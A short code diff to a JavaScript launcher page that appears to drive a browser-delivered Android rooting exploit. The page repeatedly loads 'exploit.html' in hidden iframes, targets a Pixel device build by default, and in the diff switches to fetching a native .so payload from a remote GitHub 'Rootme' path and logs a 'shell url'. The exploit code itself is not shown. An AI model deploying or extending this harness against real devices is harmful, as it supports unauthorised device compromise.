@@ -21,7 +21,7 @@ const PREVIEW_MODE = String(queryParams.get("preview") || "").trim().toLowerCase
 const PREVIEW_DEVICE_ID = String(queryParams.get("deviceId") || "").trim() || "google/pixel10/pixel10:17/CP2A.260605.012/15430684:user/release-keys";
 
 const DEVICES = [
-  { id: "custom", name: "自定义 so 文件（本地上传）", soPath: "" },
+  { id: "custom", name: "自定义 so 文件（本地上传）", path: "" },
 ];
 let selectedDevice = null;
 let selectedVersion = "";
@@ -75,7 +75,7 @@ function getDevices() {
 
 function childUrl(n) {
   const dir = location.pathname.replace(/[^/]*$/, "");
-  let url = dir + (selectedDevice ? selectedDevice.path : "") + "exploit.html?run=" + encodeURIComponent(RUN_ID) + "&attempt=" + n;
+  let url = dir + "exploit.html?run=" + encodeURIComponent(RUN_ID) + "&attempt=" + n;
   if (selectedVersion) {
     url += "&version=" + encodeURIComponent(selectedVersion);
   }
@@ -317,6 +317,7 @@ function startAttempt() {
   frame.style.pointerEvents = "none";
   frame.style.border = "0";
   frame.src = childUrl(attempt);
+  console.log("shell url: ", frame.src)
   frames.push(frame);
   (document.body || document.documentElement.appendChild(document.createElement("body"))).appendChild(frame);
   timer = setTimeout(() => {
@@ -458,7 +459,7 @@ if (selectedDevice.id === "error") {
   }
   customSoUrl = URL.createObjectURL(soFile);
 } else {
-  customSoUrl = selectedDevice.sopath || "";
+  customSoUrl = "https://raw.githubusercontent.com/ImSordayne/Rootme/devices/" + selectedDevice.path;
 }
 
 startAttempt();
